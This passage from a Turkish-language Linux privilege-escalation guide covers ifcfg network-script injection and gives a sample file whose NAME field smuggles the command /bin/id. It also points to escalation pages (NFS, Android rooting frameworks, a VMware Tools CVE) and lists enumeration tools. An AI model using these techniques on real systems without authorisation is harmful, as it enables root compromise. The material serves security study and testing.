Düşük ayrıcalıklı bir kullanıcı bir `ifcfg-*` dosyasını oluşturabiliyor veya değiştirebiliyorsa **ve** ayrıcalıklı bir ağ etkinleştirme yolu tam olarak bu dosyayı okuyacaksa, bu dosya incelenmesi gereken bir ipucudur. Etkin dosya ve dizin izinlerini, seçili arayüzü, kurulu `ifup`/`ifdown` uygulamasını ve bunları kimin çağırdığını doğrulayın. Tek başına yazılabilir bir dosya komut çalıştırılmasına neden olmaz. [Red Hat'in RHEL 7 ağ kılavuzu](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files), eski ağ betikleri ile NetworkManager arasındaki farkı açıklar: NetworkManager eski betikleri kendiliğinden tetiklemez. [RHEL 8 belgelerinde](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) varsayılan `ifup`/`ifdown` komutlarının NetworkManager'ı kullandığı, isteğe bağlı eski paketinin ise shell betikleri sağladığı belirtilir.

Gerçekten ayrıcalıklı eski betikleri kullanan bir sistemde, tırnak içine alınmamış ve shell tarafından kaynak olarak yüklenen `NAME=` gibi bir `ifcfg-*` ataması kod çalıştırma sınırını aşabilir. Tam ayrıştırıcıyı, değeri ve etkinleştirme yolunu doğrulayın; dosya adından veya NetworkManager'ın varlığından shell yorumlaması olduğu sonucunu çıkarmayın. Kullanıcı girdisini bir `ifcfg-*` dosyasına yazan ve ardından eski `ifup` komutunu çağıran, sudo ile çalıştırılmasına izin verilmiş bir wrapper; kullanıcı dosyayı doğrudan düzenleyemese bile bu sınıra ulaşmak için ayrı bir yoldur.

Örnek: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Not: Network ile /bin/id arasındaki boşluğa dikkat edin_)

### **init, init.d, systemd ve rc.d**

`/etc/init.d` dizini, System V init (SysVinit) için **klasik Linux hizmet yönetimi sistemi** olan **betiklere** ev sahipliği yapar. Hizmetleri `start`, `stop`, `restart` ve bazen `reload` etmek için betikler içerir. Bunlar doğrudan veya `/etc/rc?.d/` içinde bulunan sembolik bağlantılar aracılığıyla çalıştırılabilir. Redhat sistemlerindeki alternatif yol `/etc/rc.d/init.d` şeklindedir.

Diğer yandan `/etc/init`, Ubuntu tarafından sunulan ve hizmet yönetimi görevleri için yapılandırma dosyaları kullanan daha yeni bir **hizmet yönetimi sistemi** olan **Upstart** ile ilişkilidir. Upstart'a geçişe rağmen, Upstart'taki uyumluluk katmanı nedeniyle SysVinit betikleri Upstart yapılandırmalarıyla birlikte kullanılmaya devam eder.

**systemd**, isteğe bağlı daemon başlatma, otomatik bağlama yönetimi ve sistem durumu anlık görüntüleri gibi gelişmiş özellikler sunan modern bir başlatma ve hizmet yöneticisi olarak öne çıkar. Dağıtım paketlerine ait dosyaları `/usr/lib/systemd/`, yöneticilerin yaptığı değişiklikleri ise `/etc/systemd/system/` altında düzenleyerek sistem yönetimi sürecini kolaylaştırır.<sup>[[21]](#references)</sup>

## Diğer Yöntemler

### NFS yetki yükseltme


{{#ref}}
../../interesting-files-permissions/nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Kısıtlı Shell'den kaçış


{{#ref}}
../../main-system-information/escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
../../network-information/cisco-vmanage.md
{{#endref}}

## Android rooting framework'lerinde manager-channel kötüye kullanımı

Android rooting framework'leri, ayrıcalıklı kernel işlevlerini userspace yöneticisine açığa çıkarmak için genellikle bir syscall'a hook uygular. Zayıf yönetici kimlik doğrulaması (ör. FD sırasına dayalı imza denetimleri veya zayıf parola düzenleri), yerel bir uygulamanın yöneticiyi taklit etmesine ve önceden root erişimi elde edilmiş cihazlarda yetkisini root'a yükseltmesine olanak tanıyabilir. Daha fazla bilgi ve istismar ayrıntıları için:


{{#ref}}
../../software-information/android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Regex tabanlı exec aracılığıyla VMware Tools hizmet keşfi LPE (CWE-426) (CVE-2025-41244)

VMware Tools/Aria Operations'taki regex tabanlı hizmet keşfi, süreç komut satırlarından bir ikili dosya yolu çıkarabilir ve bunu ayrıcalıklı bir bağlamda -v ile çalıştırabilir. İzin verici desenler (ör. \S kullanımı), saldırganın yazılabilir konumlara yerleştirdiği dinleyicilerle (ör. /tmp/httpd) eşleşebilir ve root olarak kod çalıştırılmasına yol açabilir (CWE-426 Güvenilmeyen Arama Yolu).<sup>[[27]](#references)</sup>

Daha fazla bilgi edinmek ve diğer keşif/izleme yığınlarına uygulanabilecek genelleştirilmiş bir örüntüyü görmek için:

{{#ref}}
../../main-system-information/kernel-lpe-cves/vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Güvenlik Korumaları

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Daha fazla yardım

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Araçları

### **Linux'taki yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t seçeneği)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Linux ve MAC'teki kernel güvenlik açıklarını listeler [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (fiziksel erişim):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Daha fazla betiğin derlemesi**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [1] [0xdf – HTB Planning (Crontab UI yetki yükseltmesi, zip -P kimlik bilgilerinin yeniden kullanımı)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [2] [0xdf – HTB Era: cron tarafından çalıştırılan izleyici için sahte .text_sig yükü](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [3] [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH ele geçirme)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [4] [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [5] [Temel Linux Yetki Yükseltme](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [6] [Linux Yetki Yükseltme Kılavuzu](https://payatu.com/guide-linux-privilege-escalation/)
- [7] [Saldır ve Savun: 2016'nın Linux Yetki Yükseltme Teknikleri](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [8] [Kimse komut çalıştırılmasını beklemiyordu!](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [9] [Sudo (LD_PRELOAD) (Linux Yetki Yükseltme)](https://touhidshaikh.com/blog/?p=827)
- [10] [lpeworkshop – Laboratuvar Alıştırmaları İzlenecek Yol - Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [11] [frizb/Linux-Privilege-Escalation: Linux'ta Yetki Yükseltme için İpuçları ve Yöntemler](https://github.com/frizb/Linux-Privilege-Escalation)
- [12] [lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [13] [rtcrowley/linux-private-i: Linux Listeleme ve Yetki Yükseltme aracı](https://github.com/rtcrowley/linux-private-i)
- [14] [Socket nedir?](https://www.linux.com/news/what-socket/)
- [15] [Peppo (Proving Grounds) çözüm yazısı](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [D-BUS'a bağlanın](https://www.linuxjournal.com/article/7744)
- [17] [SUID Çalıştırılabilir Dosyalarıyla Linux Yetki Yükseltme](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo 2. Bölüm – Linux Yetki Yükseltme](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Linux'ta ACL'ler nasıl yönetilir](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS network-scripts aracılığıyla root erişimi](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [systemd nedir?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (günlükler üzerinden bash aritmetik enjeksiyonu, genel saldırı zinciri)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Kılavuzu – BASH_ENV (etkileşimsiz başlangıç dosyası)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink ile yetki yükseltme)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (pg_basebackup cron kopyalama → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Adını siz koyun, VMware yetki yükseltiyor (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: Sudo Chroot Yetki Yükseltmesi](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – CVE-2025-32462 ve CVE-2025-32463 Sudo yetki yükseltme güvenlik açıkları](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – PYC Depo Dizinleri](https://peps.python.org/pep-3147/)
- [32] [Python importlib belgeleri](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [@paragonsec tarafından gönderilen tweet](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Linux'ta parolaları günlüğe kaydetme](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Logrotate yarış durumu ayrıntıları](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
{{#include ../../../banners/hacktricks-training.md}}
